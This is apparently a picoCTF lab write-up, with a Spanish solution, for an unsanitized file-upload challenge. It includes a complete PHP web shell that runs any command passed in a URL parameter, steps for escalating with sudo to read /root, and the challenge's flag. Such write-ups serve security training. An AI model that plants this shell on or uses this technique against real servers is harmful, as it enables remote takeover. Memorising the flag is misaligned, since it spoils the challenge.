A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you. Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the `/root` directory.

Additional details will be available after launching your challenge instance.

Hints:
- File upload was not sanitized
- Whenever you get a shell on a remote machine, check `sudo -l`

## Solución
Debido a que no está sanitizada la entrada de archivos, se puede subir cualquier tipo de archivo, incluso un archivo de php, con el cual se puede tomar el control del servidor.

Hay que subir un archivo .php con este código:
```
<html>  
<body>  
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">  
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">  
<input type="SUBMIT" value="Execute">  
</form>  
<pre>  
<?php  
if(isset($_GET['cmd']))  
{  
system($_GET['cmd']);  
}  
?>  
</pre>  
</body>  
</html>
```

Después de subirlo, hay que ir a la url `uploads/archivo.php`. Si se ejecuta el comando `sudo -l`, se podrá ver que comandos se pueden ejecutar con sudo, y en este ejemplo se pueden ejecutar todos los comandos.

Se puede ejecutar `ls /` para ver las carpetas raíz, pero hay que ejecutar `sudo ls /root` para ver los archivos de la carpeta root, si no, no mostrará nada. Existe un archivo llamado flag.txt, y solo hay que ejecutar `sudo cat /root/flag.txt` para obtener la bandera.

`picoCTF{wh47_c4n_u_d0_wPHP_80eedb7d}`